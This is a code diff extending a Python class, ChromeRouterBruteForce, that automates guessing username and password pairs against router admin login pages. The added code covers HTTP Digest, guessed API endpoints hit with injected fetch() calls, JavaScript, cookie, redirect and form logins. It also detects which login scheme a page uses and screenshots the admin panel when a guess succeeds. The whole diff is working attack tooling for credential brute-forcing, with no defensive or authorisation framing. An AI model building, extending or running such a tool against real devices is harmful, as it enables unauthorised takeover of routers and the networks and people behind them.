@@ -697,6 +697,294 @@ class ChromeRouterBruteForce:
         except Exception as e:
             return False, f"HTTP Basic Auth error: {e}"
     
+    def test_http_digest_auth(self, username, password, login_url):
+        """Test HTTP Digest Authentication"""
+        try:
+            import requests
+            from requests.auth import HTTPDigestAuth
+            
+            print(f"{Colors.BLUE}[*] Testing HTTP Digest Auth: {username}:{password}{Colors.END}")
+            
+            # Test with requests first
+            response = requests.get(login_url, auth=HTTPDigestAuth(username, password), timeout=10)
+            
+            if response.status_code == 200:
+                print(f"{Colors.GREEN}[+] HTTP Digest Auth successful! {username}:{password}{Colors.END}")
+                # Navigate to the authenticated URL with Selenium
+                self.driver.get(login_url)
+                time.sleep(3)
+                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                return True, screenshot_path
+            else:
+                print(f"{Colors.YELLOW}[-] HTTP Digest Auth failed: Status {response.status_code}{Colors.END}")
+                return False, f"HTTP Digest Auth failed: Status {response.status_code}"
+                
+        except Exception as e:
+            return False, f"HTTP Digest Auth error: {e}"
+    
+    def test_api_based_auth(self, username, password, login_url):
+        """Test API-Based Authentication"""
+        try:
+            print(f"{Colors.BLUE}[*] Testing API-based Auth: {username}:{password}{Colors.END}")
+            
+            # Navigate to login page
+            self.driver.get(login_url)
+            time.sleep(5)
+            
+            # Try to find API endpoints
+            page_source = self.driver.page_source.lower()
+            
+            # Common API endpoints
+            api_endpoints = ['/api/login', '/api/auth', '/login', '/auth', '/api/user/login', '/api/authenticate']
+            
+            for endpoint in api_endpoints:
+                try:
+                    # Try JSON payload
+                    api_url = f"{login_url.rstrip('/')}{endpoint}"
+                    
+                    # Test with JSON payload
+                    json_payload = {
+                        'username': username,
+                        'password': password,
+                        'user': username,
+                        'pass': password,
+                        'login': username,
+                        'pwd': password
+                    }
+                    
+                    # Execute JavaScript to make API call
+                    js_code = f"""
+                    fetch('{api_url}', {{
+                        method: 'POST',
+                        headers: {{
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        }},
+                        body: JSON.stringify({json_payload})
+                    }})
+                    .then(response => response.json())
+                    .then(data => {{
+                        window.apiResult = data;
+                        window.apiSuccess = true;
+                    }})
+                    .catch(error => {{
+                        window.apiError = error;
+                        window.apiSuccess = false;
+                    }});
+                    """
+                    
+                    self.driver.execute_script(js_code)
+                    time.sleep(3)
+                    
+                    # Check result
+                    api_success = self.driver.execute_script("return window.apiSuccess;")
+                    if api_success:
+                        print(f"{Colors.GREEN}[+] API-based Auth successful! {username}:{password}{Colors.END}")
+                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                        return True, screenshot_path
+                        
+                except Exception as e:
+                    continue
+            
+            # Fallback to form-based if API fails
+            print(f"{Colors.YELLOW}[!] API auth failed, trying form-based fallback{Colors.END}")
+            return self.test_form_based_auth(username, password, login_url)
+            
+        except Exception as e:
+            return False, f"API-based Auth error: {e}"
+    
+    def test_javascript_based_auth(self, username, password, login_url):
+        """Test JavaScript-Based Authentication"""
+        try:
+            print(f"{Colors.BLUE}[*] Testing JavaScript-based Auth: {username}:{password}{Colors.END}")
+            
+            # Navigate to login page
+            self.driver.get(login_url)
+            time.sleep(5)
+            
+            # Find and fill form fields
+            username_field, password_field = self.detect_login_form()
+            
+            if not username_field or not password_field:
+                return False, "Form fields not found"
+            
+            # Fill credentials
+            username_field.clear()
+            password_field.clear()
+            username_field.send_keys(username)
+            password_field.send_keys(password)
+            
+            # Try different JavaScript submission methods
+            js_methods = [
+                "document.forms[0].submit();",
+                "document.querySelector('form').submit();",
+                "document.querySelector('input[type=submit]').click();",
+                "document.querySelector('button[type=submit]').click();",
+                "document.querySelector('input[value*=\"Login\"]').click();",
+                "document.querySelector('button:contains(\"Login\")').click();"
+            ]
+            
+            for method in js_methods:
+                try:
+                    self.driver.execute_script(method)
+                    time.sleep(5)
+                    
+                    # Check if login was successful
+                    success, reason = self.is_admin_panel_loaded()
+                    if success:
+                        print(f"{Colors.GREEN}[+] JavaScript-based Auth successful! {username}:{password}{Colors.END}")
+                        screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                        return True, screenshot_path
+                        
+                except Exception as e:
+                    continue
+            
+            return False, "JavaScript-based Auth failed"
+            
+        except Exception as e:
+            return False, f"JavaScript-based Auth error: {e}"
+    
+    def test_cookie_based_auth(self, username, password, login_url):
+        """Test Cookie-Based Authentication"""
+        try:
+            print(f"{Colors.BLUE}[*] Testing Cookie-based Auth: {username}:{password}{Colors.END}")
+            
+            # Navigate to login page
+            self.driver.get(login_url)
+            time.sleep(5)
+            
+            # Find and fill form fields
+            username_field, password_field = self.detect_login_form()
+            
+            if not username_field or not password_field:
+                return False, "Form fields not found"
+            
+            # Fill credentials
+            username_field.clear()
+            password_field.clear()
+            username_field.send_keys(username)
+            password_field.send_keys(password)
+            
+            # Submit form
+            submit_button = self.find_submit_button()
+            if submit_button:
+                submit_button.click()
+            else:
+                password_field.send_keys("\n")
+            
+            time.sleep(5)
+            
+            # Check for cookies
+            cookies = self.driver.get_cookies()
+            if cookies:
+                print(f"{Colors.BLUE}[*] Cookies found: {len(cookies)} cookies{Colors.END}")
+            
+            # Check if login was successful
+            success, reason = self.is_admin_panel_loaded()
+            if success:
+                print(f"{Colors.GREEN}[+] Cookie-based Auth successful! {username}:{password}{Colors.END}")
+                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                return True, screenshot_path
+            
+            return False, "Cookie-based Auth failed"
+            
+        except Exception as e:
+            return False, f"Cookie-based Auth error: {e}"
+    
+    def test_redirect_based_auth(self, username, password, login_url):
+        """Test Redirect-Based Authentication"""
+        try:
+            print(f"{Colors.BLUE}[*] Testing Redirect-based Auth: {username}:{password}{Colors.END}")
+            
+            # Navigate to login page
+            self.driver.get(login_url)
+            time.sleep(5)
+            
+            # Find and fill form fields
+            username_field, password_field = self.detect_login_form()
+            
+            if not username_field or not password_field:
+                return False, "Form fields not found"
+            
+            # Fill credentials
+            username_field.clear()
+            password_field.clear()
+            username_field.send_keys(username)
+            password_field.send_keys(password)
+            
+            # Submit form
+            submit_button = self.find_submit_button()
+            if submit_button:
+                submit_button.click()
+            else:
+                password_field.send_keys("\n")
+            
+            time.sleep(5)
+            
+            # Check for redirects
+            current_url = self.driver.current_url
+            if current_url != login_url:
+                print(f"{Colors.BLUE}[*] Redirect detected: {current_url}{Colors.END}")
+                
+                # Check if redirected to admin panel
+                success, reason = self.is_admin_panel_loaded()
+                if success:
+                    print(f"{Colors.GREEN}[+] Redirect-based Auth successful! {username}:{password}{Colors.END}")
+                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                    return True, screenshot_path
+            
+            return False, "Redirect-based Auth failed"
+            
+        except Exception as e:
+            return False, f"Redirect-based Auth error: {e}"
+    
+    def test_form_based_auth(self, username, password, login_url):
+        """Test Form-Based Authentication (existing method)"""
+        try:
+            print(f"{Colors.BLUE}[*] Testing Form-based Auth: {username}:{password}{Colors.END}")
+            
+            # Navigate to login page
+            self.driver.get(login_url)
+            time.sleep(5)
+            
+            # Find and fill form fields
+            username_field, password_field = self.detect_login_form()
+            
+            if not username_field or not password_field:
+                return False, "Form fields not found"
+            
+            # Fill credentials
+            username_field.clear()
+            password_field.clear()
+            username_field.send_keys(username)
+            password_field.send_keys(password)
+            
+            # Submit form
+            submit_button = self.find_submit_button()
+            if submit_button:
+                submit_button.click()
+            else:
+                password_field.send_keys("\n")
+            
+            time.sleep(5)
+            
+            # Check for alerts
+            alert_text = self.handle_alert()
+            if alert_text:
+                return False, f"Alert: {alert_text}"
+            
+            # Check if login was successful
+            success, reason = self.is_admin_panel_loaded()
+            if success:
+                print(f"{Colors.GREEN}[+] Form-based Auth successful! {username}:{password}{Colors.END}")
+                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
+                return True, screenshot_path
+            
+            return False, "Form-based Auth failed"
+            
+        except Exception as e:
+            return False, f"Form-based Auth error: {e}"
+    
     def detect_authentication_type(self, login_url):
         """Detect the type of authentication used by the login page"""
         try:
@@ -724,7 +1012,35 @@ class ChromeRouterBruteForce:
             if any(error in page_source for error in error_indicators):
                 return "error", "Error page detected"
             
-            # Check for login form indicators
+            # 🔍 **1. Check for API-Based Authentication**
+            api_indicators = ['api', 'json', 'rest', 'ajax', 'xhr', 'fetch', 'axios', 'endpoint', 'service']
+            api_count = sum(1 for indicator in api_indicators if indicator in page_source)
+            if api_count >= 2:
+                print(f"{Colors.GREEN}[+] API-based authentication detected{Colors.END}")
+                return "api", "API-based authentication detected"
+            
+            # 🔍 **2. Check for JavaScript-Based Authentication**
+            js_indicators = ['javascript', 'js', 'onclick', 'onload', 'onchange', 'onsubmit', 'addEventListener', 'jquery', 'angular', 'react', 'vue']
+            js_count = sum(1 for indicator in js_indicators if indicator in page_source)
+            if js_count >= 3:
+                print(f"{Colors.GREEN}[+] JavaScript-based authentication detected{Colors.END}")
+                return "javascript", "JavaScript-based authentication detected"
+            
+            # 🔍 **3. Check for Cookie-Based Authentication**
+            cookie_indicators = ['cookie', 'session', 'token', 'csrf', 'csrf_token', 'authenticity_token', 'sessionid', 'jsessionid']
+            cookie_count = sum(1 for indicator in cookie_indicators if indicator in page_source)
+            if cookie_count >= 2:
+                print(f"{Colors.GREEN}[+] Cookie-based authentication detected{Colors.END}")
+                return "cookie", "Cookie-based authentication detected"
+            
+            # 🔍 **4. Check for Redirect-Based Authentication**
+            redirect_indicators = ['redirect', 'location', 'window.location', 'href', 'url', 'goto', 'forward']
+            redirect_count = sum(1 for indicator in redirect_indicators if indicator in page_source)
+            if redirect_count >= 2:
+                print(f"{Colors.GREEN}[+] Redirect-based authentication detected{Colors.END}")
+                return "redirect", "Redirect-based authentication detected"
+            
+            # 🔍 **5. Check for Form-Based Authentication**
             form_indicators = ['username', 'password', 'login', 'sign in', 'authentication', 'enter credentials', 'user login', 'admin login', 'router login']
             form_count = sum(1 for indicator in form_indicators if indicator in page_source)
             
@@ -739,13 +1055,32 @@ class ChromeRouterBruteForce:
                 elif form_count >= 2:
                     print(f"{Colors.GREEN}[+] Form-based authentication detected (by content){Colors.END}")
                     return "form", "Form-based authentication detected by content"
-                else:
-                    print(f"{Colors.BLUE}[*] No clear form detected, trying HTTP Basic Auth{Colors.END}")
-                    return "basic", "No form detected, trying HTTP Basic Auth"
                     
             except Exception as e:
                 print(f"{Colors.YELLOW}[!] Error detecting form fields: {e}{Colors.END}")
-                return "basic", f"Error detecting form: {e}"
+            
+            # 🔍 **6. Check for HTTP Basic/Digest Authentication**
+            # Try to access the page and check response headers
+            try:
+                import requests
+                response = requests.get(login_url, timeout=10, allow_redirects=False)
+                
+                # Check for HTTP Basic Auth
+                if response.status_code == 401 and 'www-authenticate' in response.headers:
+                    auth_header = response.headers['www-authenticate'].lower()
+                    if 'basic' in auth_header:
+                        print(f"{Colors.GREEN}[+] HTTP Basic authentication detected{Colors.END}")
+                        return "basic", "HTTP Basic authentication detected"
+                    elif 'digest' in auth_header:
+                        print(f"{Colors.GREEN}[+] HTTP Digest authentication detected{Colors.END}")
+                        return "digest", "HTTP Digest authentication detected"
+                        
+            except Exception as e:
+                print(f"{Colors.YELLOW}[!] Error checking HTTP auth headers: {e}{Colors.END}")
+            
+            # 🔍 **7. Default fallback**
+            print(f"{Colors.BLUE}[*] No specific auth type detected, trying HTTP Basic Auth{Colors.END}")
+            return "basic", "No specific auth type detected, trying HTTP Basic Auth"
                 
         except Exception as e:
             return "error", f"Error detecting auth type: {e}"
@@ -762,83 +1097,36 @@ class ChromeRouterBruteForce:
             if auth_type == "error":
                 return False, f"Page load error: {auth_reason}"
             
-            # Try HTTP Basic Authentication first (for URLs that might support it)
+            # Route to appropriate authentication method
             if auth_type == "basic":
-                basic_auth_success, basic_auth_result = self.test_http_basic_auth(username, password, login_url)
-                if basic_auth_success:
-                    return True, basic_auth_result
-            
-            # For form-based authentication or if basic auth failed
-            print(f"{Colors.BLUE}[*] Attempting form-based authentication{Colors.END}")
-            
-            # Navigate to login page for form-based authentication
-            self.driver.get(login_url)
-            time.sleep(5)  # Wait longer for page to load completely
-            
-            # Check if page loaded properly (not error page)
-            is_admin, reason = self.is_admin_panel_loaded()
-            if "Error page detected" in reason:
-                print(f"{Colors.YELLOW}[!] Page load error detected, refreshing...{Colors.END}")
-                self.driver.refresh()
-                time.sleep(5)
-            
-            # Detect login form
-            username_field, password_field = self.detect_login_form()
-            
-            if not username_field or not password_field:
-                print(f"{Colors.RED}[!] Could not find login form fields{Colors.END}")
-                return False, "Form fields not found"
-            
-            print(f"{Colors.GREEN}[+] Login form fields found{Colors.END}")
-            
-            # Clear and fill fields
-            try:
-                username_field.clear()
-                password_field.clear()
-                username_field.send_keys(username)
-                password_field.send_keys(password)
-                print(f"{Colors.BLUE}[*] Credentials entered{Colors.END}")
-            except Exception as e:
-                print(f"{Colors.YELLOW}[!] Could not fill form fields: {e}{Colors.END}")
-                return False, f"Form filling error: {e}"
-            
-            # Find and click submit button
-            submit_button = self.find_submit_button()
-            if submit_button:
-                try:
-                    submit_button.click()
-                    print(f"{Colors.BLUE}[*] Submit button clicked{Colors.END}")
-                except:
-                    # Try pressing Enter on password field
-                    password_field.send_keys("\n")
-                    print(f"{Colors.BLUE}[*] Enter key pressed{Colors.END}")
+                return self.test_http_basic_auth(username, password, login_url)
+            elif auth_type == "digest":
+                return self.test_http_digest_auth(username, password, login_url)
+            elif auth_type == "api":
+                return self.test_api_based_auth(username, password, login_url)
+            elif auth_type == "javascript":
+                return self.test_javascript_based_auth(username, password, login_url)
+            elif auth_type == "cookie":
+                return self.test_cookie_based_auth(username, password, login_url)
+            elif auth_type == "redirect":
+                return self.test_redirect_based_auth(username, password, login_url)
+            elif auth_type == "form":
+                return self.test_form_based_auth(username, password, login_url)
             else:
-                # Try pressing Enter on password field
-                password_field.send_keys("\n")
-                print(f"{Colors.BLUE}[*] Enter key pressed (no submit button found){Colors.END}")
-            
-            # Wait for page to load and handle any alerts
-            time.sleep(5)  # Wait longer for page to load completely
-            
-            # Check for alerts (login failure messages)
-            alert_text = self.handle_alert()
-            if alert_text:
-                print(f"{Colors.YELLOW}[-] Login failed: {alert_text}{Colors.END}")
-                return False, f"Alert: {alert_text}"
-            
-            # Check if login was successful using new method
-            success, reason = self.is_admin_panel_loaded()
-            
-            if success:
-                print(f"{Colors.GREEN}[+] Login successful! {reason}{Colors.END}")
-                # Wait a bit more for admin panel to fully load
-                time.sleep(3)
-                # Take screenshot of successful login (admin panel) - ONLY when successful
-                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
-                return True, screenshot_path
-            else:
-                print(f"{Colors.YELLOW}[-] Login failed: {reason}{Colors.END}")
-                return False, reason
+                # Default fallback - try multiple methods
+                print(f"{Colors.YELLOW}[!] Unknown auth type, trying multiple methods{Colors.END}")
+                
+                # Try HTTP Basic Auth first
+                basic_success, basic_result = self.test_http_basic_auth(username, password, login_url)
+                if basic_success:
+                    return True, basic_result
+                
+                # Try Form-based Auth
+                form_success, form_result = self.test_form_based_auth(username, password, login_url)
+                if form_success:
+                    return True, form_result
+                
+                return False, "All authentication methods failed"
                 
         except Exception as e:
             print(f"{Colors.RED}[!] Error testing credentials {username}:{password}: {e}{Colors.END}")
